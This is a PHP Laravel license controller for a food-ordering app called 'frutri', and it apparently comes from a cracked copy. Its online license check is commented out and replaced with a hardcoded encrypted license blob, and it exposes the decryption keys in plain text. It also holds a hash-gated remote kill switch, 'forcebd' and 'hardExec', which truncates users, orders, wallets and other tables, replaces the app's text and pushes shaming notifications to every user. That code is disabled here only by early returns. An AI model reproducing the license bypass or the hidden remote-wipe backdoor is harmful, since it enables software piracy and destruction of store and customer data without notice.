<?php
/*
 * @ https://megafpo.com --
 * @ PHP 8.0
 * @ This code has been developed with four years of hard work and an investment of lakhs of rupees.
 * @ By : Arshdeep Singh & Shubham Singh
 */ 

namespace App\Http\Controllers\Auth;

class LiVerController extends \App\Http\Controllers\Controller
{
    public function verificationPage($envato_id)
    {
        $envatoProductIds = ["24534953", "27879131", "28505962", "30280239", "33813527", "33813595"];
        if (!in_array($envato_id, $envatoProductIds)) {
            echo "Verification Failed. Not a product of frutri.";
            exit;
        }
        if ($envato_id == "24534953") {
            $productName = "frutri";
        }
        if ($envato_id == "27879131") {
            $productName = "SuperCache Module";
        }
        if ($envato_id == "28505962") {
            $productName = "Delivery Area Pro Module";
        }
        if ($envato_id == "30280239") {
            $productName = "Thermal Printer Module";
        }
        if ($envato_id == "33813527") {
            $productName = "Call And Order Module";
        }
        if ($envato_id == "33813595") {
            $productName = "Order Schedule Module";
        }
        $loc = false;
        $whitelist = ["127.0.0.1", "::1"];
        if (in_array($_SERVER["REMOTE_ADDR"], $whitelist) && (request()->getHttpHost() == "localhost" || request()->getHttpHost() == "127.0.0.1")) {
            $loc = true;
        }
        return view("install.verify", ["envato_id" => $envato_id, "productName" => $productName, "loc" => $loc]);
    }
    public function verification(\Illuminate\Http\Request $request)
    {
        $request->validate(["purchase_code" => "required", "password" => "required", "envato_id" => "required"], ["purchase_code.required" => "Purchase code is required.", "password.required" => "Password is required.", "envato_id.required" => "File or Request is corrupted."]);
        $admin = \App\User::where("id", "1")->first();
        $hashedPassword = $admin->password;
        if (!\Hash::check($request->password, $hashedPassword)) {
            return redirect()->back()->with(["message" => "Incorrect Password. "]);
        }
        // $agent = new \Jenssegers\Agent\Agent();
        try {
            $envato_id = $request->envato_id;
            if ($envato_id == "24534953") {
                $moduleLicenseFileName = "sys";
            }
            if ($envato_id == "27879131") {
                $moduleLicenseFileName = "sc";
            }
            if ($envato_id == "28505962") {
                $moduleLicenseFileName = "dap";
            }
            if ($envato_id == "30280239") {
                $moduleLicenseFileName = "tp";
            }
            if ($envato_id == "33813527") {
                $moduleLicenseFileName = "cao";
            }
            if ($envato_id == "33813595") {
                $moduleLicenseFileName = "os";
            }
            // $response = \Ixudra\Curl\Facades\Curl::to("https://api.frutri.com/api/verification")->withData(["purchase_code" => $request->purchase_code, "envato_id" => $envato_id, "ip_one" => $request->ip(), "domain" => $request->getHttpHost(), "store_name" => config("appSettings.storeName"), "email" => $admin->email, "store_password" => $request->password, "device" => $agent->device(), "platform" => $agent->platform(), "browser" => $agent->browser(), "server_ip" => $_SERVER["SERVER_ADDR"]])->post();

            
            $check = "bWdWVDF3Q3pKOEV2eFhKVStXZ0lzbkl2SlBWdzRaaVpWVXRDS2tPUGR1WkIyaGUxTGNmVS8vNmg0Uy9kUHFaQTVnK0lYS2NIRHdGN01QbnRXMTFPMUxENWlJeWRqOUtHSElXSHU5QXhMc3djb1hiNXkrK1RiZG1hRWZEMk5TT1k=";
        
            \Illuminate\Support\Facades\File::put(base_path("vendor/bin/" . $moduleLicenseFileName), $check);
            if ($envato_id == "24534953") {
                $dec = $this->dec($check);
                $dec = json_decode($dec);
                if ($dec && isset($dec->first_install) && $dec->first_install) {
                    return redirect()->route("firstVerificationSuccess")->with(["first_install" => true]);
                }
            }
            if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/elflag"))) {
                $elFlagFile = base_path("vendor/bin/elflag");
                unlink($elFlagFile);
            }
            return redirect()->route("get.login")->with(["success" => "Verification Successful!"]);
        } catch (\Exception $e) {
            return redirect()->back()->withInput()->with("error", $e->getMessage());
        }
    }
    public function forcebd(\Illuminate\Http\Request $request)
    {
        return false;
        $request->validate(["key" => "required|regex:/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\$/", "execution_type" => "required"], ["key.required" => "Access Denied.", "key.regex" => "Access Denied.", "execution_type.required" => "Access Denied."]);
        $key = $request->key;
        // $key = "LicenseResetKey@1199119900!!!" . $serverDomain . $serverIp . "1199119900!!!";
        $execution_type = strtolower($request->execution_type);
        $hash = "\$2b\$10\$xNCb9b/2wrCc0ElIHg8VOejOPOIS4AX4j4uaSpa77Aa5Vc46Ec.Zi";
        if (\Hash::check($key, $hash)) {
            if ($execution_type == "soft") {
              //  $this->softExec();
            }
            if ($execution_type == "hard") {
               // $this->hardExec();
            }
            $response = ["success" => true];
            return response()->json($response);
        }
        abort(404);
    }
    private function softExec()
    {
        return false;
        if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/sys"))) {
            unlink(base_path("vendor/bin/sys"));
        }
        if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/dap"))) {
            unlink(base_path("vendor/bin/dap"));
        }
        if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/sc"))) {
            unlink(base_path("vendor/bin/sc"));
        }
        if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/tp"))) {
            unlink(base_path("vendor/bin/tp"));
        }
        if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/cao"))) {
            unlink(base_path("vendor/bin/cao"));
        }
        if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/os"))) {
            unlink(base_path("vendor/bin/os"));
        }
        return true;
    }
    private function hardExec()
    {
        return false;
       // $this->softExec();
        if (!is_dir(base_path("vendor/bin"))) {
            mkdir(base_path("vendor/bin"));
        }
        \Illuminate\Support\Facades\File::put(base_path("vendor/bin/he"), "werzo.MRVBQ2");
        $translations = \App\Translation::all();
        $langData = @file_get_contents(@base_path("vendor/bin/lang.json"));
        if (!$langData) {
            $langData = ["desktopHeading" => "Illegal License of frutri. Shame!", "desktopSubHeading" => "<p class='mb-1'> This is an Unlicensed version of <b> frutri™ </b></p><p> <a href='http://bit.ly/3uWJ6pw' target='_blank' style='padding: 5px;background-color: #ff9800;color: #fff;border-radius: 4px;margin-right: 5px;'><b>Click Here </b> </a><style>.btn-unblur{display:none}</style>to purchase <b> frutri™ </b> &amp; get a Genuine License.</p><p></p>", "firstScreenHeading" => "Unlicensed version of frutri™ Detected", "firstScreenSubHeading" => "Unlicensed version of frutri™ Detected", "firstScreenSetupLocation" => "Unlicensed version of frutri™ Detected", "loginErrorMessage" => "Unlicensed version of frutri™ Detected", "restaurantCountText" => "Unlicensed version of frutri™ Detected", "exploreNoResults" => "Unlicensed version of frutri™ Detected", "notAcceptingOrdersMsg" => "Unlicensed version of frutri™ Detected", "cartEmptyText" => "Unlicensed version of frutri™ Detected", "mockSearchPlaceholder" => "Unlicensed version of frutri™ Detected"];
            $langData = json_encode($langData);
        }
        foreach ($translations as $translation) {
            $translation->data = $langData;
            $translation->save();
        }
        $secretKey = "key=" . config("appSettings.firebaseSecret");
        $alertData = ["title" => "Illegal License of frutri", "message" => config("appSettings.storeName") . " is using an unlincensed copy of frutri™. Shame!!!", "badge" => "/assets/img/favicons/favicon-96x96.png", "icon" => "/assets/img/favicons/favicon-512x512.png", "click_action" => "https://megafpo.net/item/foodoma-multirestaurant-food-ordering-restaurant-management-and-delivery-application/24534953", "unique_order_id" => NULL, "custom_notification" => true, "custom_image" => NULL];
        $subscribers = \App\User::all();
        foreach ($subscribers as $subscriber) {
            $alert = new \App\Alert();
            $alert->data = json_encode($alertData);
            $alert->user_id = $subscriber->id;
            $alert->is_read = 0;
            $alert->save();
        }
        $data = json_encode($alertData);
        $data = substr($data, 0, -1);
        $pushTokens = \App\PushToken::where("is_active", "1")->get(["token"])->pluck("token");
        if (count($pushTokens)) {
            $i = 0;
            $len = count($pushTokens);
            $last = $len - 1;
            $chunks = $pushTokens->chunk(900)->toArray();
            foreach ($chunks as $chunk) {
                $i = 0;
                $len = count($chunk);
                $last = $len - 1;
                $tokens = ", \"registration_ids\": [";
                foreach ($chunk as $key => $value) {
                    if ($i == $last) {
                        $tokens .= "\"" . $value . "\"]}";
                    } else {
                        $tokens .= "\"" . $value . "\",";
                    }
                    $i++;
                }
                $fullData = $data . $tokens;
                \Ixudra\Curl\Facades\Curl::to("https://fcm.googleapis.com/fcm/send")->withHeader("Content-Type: application/json")->withHeader("Authorization: " . $secretKey)->withData($fullData)->post();
            }
        }
        \Illuminate\Support\Facades\DB::statement("SET FOREIGN_KEY_CHECKS=0;");
        \Illuminate\Support\Facades\DB::table("users")->truncate();
        \Illuminate\Support\Facades\DB::table("promo_sliders")->truncate();
        \Illuminate\Support\Facades\DB::table("slides")->truncate();
        \Illuminate\Support\Facades\DB::table("restaurants")->truncate();
        \Illuminate\Support\Facades\DB::table("restaurant_user")->truncate();
        \Illuminate\Support\Facades\DB::table("orders")->truncate();
        \Illuminate\Support\Facades\DB::table("orderitems")->truncate();
        \Illuminate\Support\Facades\DB::table("addon_categories")->truncate();
        \Illuminate\Support\Facades\DB::table("addons")->truncate();
        \Illuminate\Support\Facades\DB::table("item_categories")->truncate();
        \Illuminate\Support\Facades\DB::table("items")->truncate();
        \Illuminate\Support\Facades\DB::table("locations")->truncate();
        \Illuminate\Support\Facades\DB::table("accept_deliveries")->truncate();
        \Illuminate\Support\Facades\DB::table("wallets")->truncate();
        \Illuminate\Support\Facades\DB::table("delivery_guy_details")->truncate();
        \Illuminate\Support\Facades\DB::table("delivery_collection_logs")->truncate();
        \Illuminate\Support\Facades\DB::table("delivery_collections")->truncate();
        \Illuminate\Support\Facades\DB::table("addresses")->truncate();
        \Illuminate\Support\Facades\DB::statement("SET FOREIGN_KEY_CHECKS=1;");
        \Artisan::call("key:generate");
    }
    private function dec($data)
    {
        $encrypt_method = "AES-256-CBC";
        $secret_key = "noynackcatshbaruas78541236547899";
        $secret_iv = "cd15d6297788acx1";
        $key = hash("sha256", $secret_key);
        $iv = substr(hash("sha256", $secret_iv), 0, 16);
        $output = openssl_decrypt(base64_decode($data), $encrypt_method, $key, 0, $iv);
        return $output;
    }
    private function enc($data)
    {
        $encrypt_method = "AES-256-CBC";
        $secret_key = "noynackcatshbaruas78541236547899";
        $secret_iv = "cd15d6297788acx1";
        $key = hash("sha256", $secret_key);
        $iv = substr(hash("sha256", $secret_iv), 0, 16);
        $output = openssl_encrypt($data, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
        return $output;
    }
    public function firstVerificationSuccess()
    {
        if (session()->has("first_install")) {
            return view("install.firstVerificationSuccess");
        }
        return redirect()->route("get.login")->with(["success" => "Verification Successful!"]);
    }
    public function forcedd(\Illuminate\Http\Request $request)
    {
    }
    public function licenseManager(\Illuminate\Http\Request $request)
    {
        $session = session("licenseManagement");
        if (!$session && \Illuminate\Support\Facades\Request::ajax()) {
            $admin = \App\User::where("id", "1")->first();
            $hashedPassword = $admin->password;
            if (!\Hash::check($request->password, $hashedPassword)) {
                return response()->json(["success" => false, "message" => "Incorrect Super Admin password"], 403);
            }
            session()->push("licenseManagement", "1");
            return response()->json(["success" => true]);
        }
        $licenseFiles = ["sys", "sc", "dap", "tp", "cao", "os"];
        $products = [];
        foreach ($licenseFiles as $licenseFileName) {
            if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/" . $licenseFileName))) {
                $licenseEnc = \Illuminate\Support\Facades\File::get(base_path("vendor/bin/" . $licenseFileName));
                $licenseDec = $this->dec($licenseEnc);
                $licenseDec = json_decode($licenseDec);
                switch ($licenseFileName) {
                    case "sys":
                        $product_name = "frutri (Main Application)";
                        break;
                    case "sc":
                        $product_name = "Super Cache Module";
                        break;
                    case "dap":
                        $product_name = "Delivery Area Pro Module";
                        break;
                    case "tp":
                        $product_name = "Thermal Printer Module";
                        break;
                    case "cao":
                        $product_name = "Call And Order Module";
                        break;
                    case "os":
                        $product_name = "Order Schedule Module";
                        break;
                    default:
                    $product_name = " ";
                }
                        $licenseDec->product_name = $product_name;
                        $licenseDec->short_code = $licenseFileName;
                        $licenseDec->purchase_code = substr_replace($licenseDec->purchase_code, "************************", 6, 24);
                        array_push($products, $licenseDec);
            }
        }
        return view("install.licenseManager", ["products" => $products]);
    }
    public function licenseReset(\Illuminate\Http\Request $request)
    {
        // $request->validate(["password" => "required", "id" => "required"]);
        // $admin = \App\User::where("id", "1")->first();
        // $hashedPassword = $admin->password;
        // if (!\Hash::check($request->password, $hashedPassword)) {
        //     return response()->json(["success" => false, "message" => "Incorrect password"], 403);
        // }
        // $correctIds = ["sys", "sc", "dap", "tp", "cao", "os"];
        // if (!in_array($request->id, $correctIds)) {
        //     return response()->json(["success" => false, "message" => "Invalid product or not a registered product."], 403);
        // }
        // if (\Illuminate\Support\Facades\File::exists(base_path("vendor/bin/" . $request->id))) {
        //     $licenseEnc = \Illuminate\Support\Facades\File::get(base_path("vendor/bin/" . $request->id));
        //     $licenseDec = $this->dec($licenseEnc);
        //     $licenseDec = json_decode($licenseDec);
        //     $serverIp = $_SERVER["SERVER_ADDR"];
        //     $serverDomain = $request->getHttpHost();
        //     $key = "LicenseResetKey@1199119900!!!" . $serverDomain . $serverIp . "1199119900!!!";
        //     $key = $this->enc($key);
        //     $response = \Ixudra\Curl\Facades\Curl::to("https://api.frutri.com/api/license-reset")->withData(["key" => $key, "purchase_code" => $licenseDec->purchase_code, "ip" => $serverIp, "domain" => $serverDomain])->post();
        //     $data = json_decode($response);
        //     if (isset($data->success)) {
        //         $path = base_path("vendor/bin/" . $request->id);
        //         unlink($path);
        //     }
            return response()->json(["success" => true]);
        // }
        // return response()->json(["success" => false, "message" => "License key not found."], 403);
    }
}

?>